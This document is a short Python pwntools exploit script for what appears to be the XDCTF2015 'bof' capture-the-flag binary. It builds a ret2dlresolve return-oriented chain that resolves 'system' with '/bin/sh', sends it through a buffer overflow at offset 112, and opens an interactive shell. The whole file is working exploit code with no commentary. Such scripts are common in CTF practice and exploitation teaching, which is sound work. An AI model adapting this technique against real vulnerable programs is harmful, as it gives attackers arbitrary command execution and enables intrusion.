from pwn import *

elf = ELF("./bof")
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
p = process("./bof")
p.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})

p.sendline(payload)
p.interactive()